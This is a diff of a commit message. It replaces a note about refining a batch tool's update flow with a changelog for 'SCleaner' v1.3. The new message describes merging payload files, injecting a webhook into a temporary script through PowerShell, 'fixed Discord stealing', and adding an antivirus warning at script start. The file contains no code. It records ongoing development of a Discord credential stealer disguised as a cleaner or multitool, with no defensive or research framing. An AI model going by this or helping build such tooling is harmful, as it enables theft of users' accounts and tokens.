@@ -1,2 +1,2 @@
-Refine update flow
-Restructure SchooiMultitool.bat update-check logic to always prompt when an update is available, move the portable check into the update-action branch, and ensure sync.bat is invoked correctly for portable and non-portable cases. Also fixed block ordering and exit behavior so updates are handled consistently.
+Update SCleaner to v1.3 and fixed Discord stealer
+Bump SCleaner from v1.2 to v1.3 and consolidate payloads by merging isgen2.txt into isgen.txt (isgen2.txt deleted). Replace the previous append-then-append-webhook flow with a PowerShell-based replacement to inject the provided webhook into the temp SCleaner script. Fixed Discord stealing, changed WinPython to python embeddable (preconfed) and added AV warning in script start for positive image
